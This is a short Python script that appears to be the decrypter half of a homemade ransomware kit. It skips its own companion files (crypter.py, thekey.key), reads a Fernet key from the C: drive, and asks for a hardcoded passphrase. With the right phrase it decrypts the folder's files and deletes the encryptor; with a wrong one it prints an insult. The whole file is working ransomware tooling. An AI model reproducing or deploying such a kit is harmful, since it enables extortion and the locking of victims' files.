# import modules
import os
from cryptography.fernet import Fernet

# files list
files = []

def del_enc():
	try:
		os.system("del crypter.py")
	except:
		pass

for file in os.listdir():
	if file == "crypter.py" or file == "thekey.key" or file == "decrypter.py" or file == "desktop.ini":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("C:\\thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "gimme_pls"
user_phrase = input("what is a secret phrase: ")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)

		try:
			with open(file, "wb") as thefile:
				thefile.write(contents_decrypted)
		except:
			continue
		del_enc()
		print("Congratulation, your files been decrypted!")
else:
	print("Sorry wrong phrase, Fuck you :)")
